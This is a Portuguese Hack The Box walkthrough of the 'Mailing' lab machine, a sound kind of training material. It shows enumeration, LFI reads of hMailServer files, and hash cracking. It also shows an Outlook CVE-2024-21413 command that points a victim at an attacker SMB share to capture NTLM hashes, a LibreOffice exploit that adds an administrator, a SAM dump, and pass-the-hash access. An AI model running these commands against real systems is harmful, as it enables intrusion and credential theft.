---
title: HTB Máquinas - Mailing
date: 2024-05-06 10:50:12 +0300
categories: [HTB, Máquinas]
tags: [máquinas, htb]     # TAG names should always be lowercase
---

# Mailing

## Enumeração

```
┌──(yoshiro㉿kali)-[~]
└─$ nmap -sV -A 10.10.11.14    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 08:22 -03
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.35s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mailing
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: ACL IMAP4rev1 CHILDREN IDLE NAMESPACE RIGHTS=texkA0001 CAPABILITY SORT completed IMAP4 OK QUOTA
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-06T11:23:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.23 seconds
```

É possível identificar que o servidor está rodando Microsoft-IIS/10. E esse servidor é vulneravel a ataques LFI.

![](https://i.imgur.com/NpRHvzW.png)

## Explorando a vulnerabildade

Indo até ../../Program+Files+(x86)/hMailServer/Logs/hmailserver_awstats.log é possível vizualizar usuários cadastrados.

![](https://i.imgur.com/cWfgezF.png)

Indo até ../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI é possível identificar uma hash de senha.

![](https://i.imgur.com/EWMNmkB.png)

## User flag

Essa Hash se trata de uma MD5. Quebrando-a:

```
┌──(yoshiro㉿kali)-[~/htb]
└─$ hashcat -m 0 -a 0 hash.txt rockyou.txt 
```
![](https://i.imgur.com/H9j8gHV.png)

Com esse login, é possível acessar o telnet.

![](https://i.imgur.com/uyISYhF.png)

Pesquisando novamente encontrei esse exploit: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file

Esse exploit permite enviar um e-mail para a Maya para capturar a senha do NTLM.

```
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\10.10.14.51\mailing' --subject Yoshi
```

Utilize o responder para capturar o e-mail enviado para a Maya.
```
sudo responder -I tun0 -vudo responder -I tun0 -v
```
![](https://i.imgur.com/iHpNrkX.png)

Quebrando:
```
hashcat -m 5600 hash.txt rockyou.txt 
```
![](https://i.imgur.com/2z5u2bf.png)

Utilizando o login da maya, é possível acessar a máquina via evil-winrm e conseguir a user flag.
```
evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
```
![](https://i.imgur.com/YfXYxzu.png)

## Root flag

Utilizei o CVE-2023-2255 que explora uma vulnerabilidade no LibreOffice para dar permissões a maya de administrador local.
https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-file

```
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
```
![](https://i.imgur.com/ywnGvrv.png)

Utilizando o crackmapexec que permite executar comandos remotos diretamente ao sistema operacional. 

Utilizando o --sam, o crackmapexec fará um dump no banco de dados SAM. Esse banco armazena credenciais dos usuários em um sistema windows.

```
crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
```

![](https://i.imgur.com/Wvn2b1v.png)

Utilizando a hash que o crackmapexec forneceu, é possível acessar via impacket-wmiexec.

```
impacket-wmiexec localadmin@10.10.11.14 -hashes aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae
```
Dessa forma, é possível conseguir a root flag.

![](https://i.imgur.com/3FOXYaW.png)